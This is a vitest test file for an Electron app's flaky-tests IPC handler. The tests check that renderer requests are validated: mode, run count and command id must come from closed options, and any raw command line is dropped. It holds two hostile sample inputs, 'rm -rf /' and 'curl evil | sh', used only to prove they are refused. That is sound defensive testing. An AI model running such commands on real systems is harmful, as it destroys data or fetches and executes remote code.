/**
 * The flaky tests handler: what the renderer asks is checked in the main
 * process (a known mode, a bounded number of runs, a detected command named by
 * its id, never a command line), and a server project's run goes to the
 * server with the same closed options.
 */

import { beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
	relayServerAnalysis: vi.fn(),
	cancelServerAnalysis: vi.fn(),
	serverProjectAtPath: vi.fn(),
	send: vi.fn(),
	handlers: new Map<string, (...args: unknown[]) => unknown>(),
}));

vi.mock("electron", () => ({
	app: { isPackaged: false, getAppPath: () => "/app" },
	BrowserWindow: { getAllWindows: () => [{ webContents: { send: mocks.send } }] },
	ipcMain: {
		handle: (channel: string, handler: (...args: unknown[]) => unknown) =>
			mocks.handlers.set(channel, handler),
	},
}));
vi.mock("../../python-env-manager.js", () => ({
	pythonEnvManager: { getPythonPath: () => null },
}));
vi.mock("../../utils/python-runner-env", () => ({ pythonRunnerEnv: async () => ({}) }));
vi.mock("../server-analyses", () => ({
	relayServerAnalysis: mocks.relayServerAnalysis,
	cancelServerAnalysis: mocks.cancelServerAnalysis,
	serverProjectAtPath: mocks.serverProjectAtPath,
}));

import { IPC_CHANNELS } from "../../../shared/constants/ipc";
import {
	checkRunRequest,
	decodeRunnerError,
	registerFlakyTestsHandlers,
	runnerArgs,
} from "../flaky-tests-handlers";

beforeEach(() => {
	mocks.handlers.clear();
	mocks.relayServerAnalysis.mockReset();
	mocks.serverProjectAtPath.mockReset();
	mocks.send.mockReset();
	registerFlakyTestsHandlers();
});

describe("checkRunRequest", () => {
	it("defaults to a scan", () => {
		expect(checkRunRequest({ projectPath: "/p" })).toEqual({
			projectPath: "/p",
			mode: "scan",
			runs: 5,
			commandId: "auto",
		});
	});

	it("bounds the number of runs", () => {
		expect(checkRunRequest({ projectPath: "/p", mode: "run", runs: 500 }).runs).toBe(20);
		expect(checkRunRequest({ projectPath: "/p", mode: "run", runs: 0 }).runs).toBe(2);
		expect(() => checkRunRequest({ projectPath: "/p", runs: "5" })).toThrow();
		expect(() => checkRunRequest({ projectPath: "/p", runs: 2.5 })).toThrow();
	});

	it("refuses an unknown mode or command, and a missing project", () => {
		expect(() => checkRunRequest({ projectPath: "/p", mode: "exec" })).toThrow();
		expect(() =>
			checkRunRequest({ projectPath: "/p", mode: "run", commandId: "rm -rf /" }),
		).toThrow("unknown test command");
		expect(() => checkRunRequest({})).toThrow("projectPath is required");
		expect(() => checkRunRequest(null)).toThrow("projectPath is required");
	});

	it("drops anything else the renderer sends, a command line included", () => {
		const checked = checkRunRequest({
			projectPath: "/p",
			mode: "run",
			commandId: "dotnet",
			command: "curl evil | sh",
		});
		expect(checked).not.toHaveProperty("command");
		expect(runnerArgs(checked)).toEqual([
			"--project-path",
			"/p",
			"--mode",
			"run",
			"--runs",
			"5",
			"--command-id",
			"dotnet",
		]);
	});

	it("passes no run argument for a scan", () => {
		expect(runnerArgs(checkRunRequest({ projectPath: "/p" }))).toEqual([
			"--project-path",
			"/p",
		]);
	});
});

describe("decodeRunnerError", () => {
	it("reads the runner's JSON string, newlines included", () => {
		expect(decodeRunnerError('"no_results: none\\nerror CS1002"')).toBe(
			"no_results: none\nerror CS1002",
		);
		expect(decodeRunnerError("plain message")).toBe("plain message");
		expect(decodeRunnerError('"broken')).toBe('"broken');
	});
});

describe("flaky tests handlers", () => {
	it("sends a server project's run to the server with closed options", async () => {
		const project = { id: "p-1" };
		mocks.serverProjectAtPath.mockReturnValue(project);
		mocks.relayServerAnalysis.mockResolvedValue({ totalTests: 0 });
		const run = mocks.handlers.get(IPC_CHANNELS.FLAKY_TESTS_RUN);
		await run?.({}, { projectPath: "/mirror/p-1", mode: "run", runs: 3, commandId: "go" });
		expect(mocks.relayServerAnalysis).toHaveBeenCalledWith(
			project,
			"flaky-tests",
			{ mode: "run", runs: 3, command_id: "go" },
			expect.any(Object),
		);
		await run?.({}, { projectPath: "/mirror/p-1" });
		expect(mocks.relayServerAnalysis).toHaveBeenLastCalledWith(
			project,
			"flaky-tests",
			{},
			expect.any(Object),
		);
	});

	it("tells the view a refused request", async () => {
		const run = mocks.handlers.get(IPC_CHANNELS.FLAKY_TESTS_RUN);
		await expect(run?.({}, { projectPath: "/p", mode: "exec" })).rejects.toThrow();
		expect(mocks.send).toHaveBeenCalledWith(
			IPC_CHANNELS.FLAKY_TESTS_ERROR,
			"mode must be scan or run",
		);
	});

	it("detects nothing locally for a server project", async () => {
		mocks.serverProjectAtPath.mockReturnValue({ id: "p-1" });
		const detect = mocks.handlers.get(IPC_CHANNELS.FLAKY_TESTS_DETECT);
		expect(await detect?.({}, { projectPath: "/mirror/p-1" })).toEqual({
			commands: [],
			remote: true,
		});
		await expect(detect?.({}, {})).rejects.toThrow("projectPath is required");
	});
});
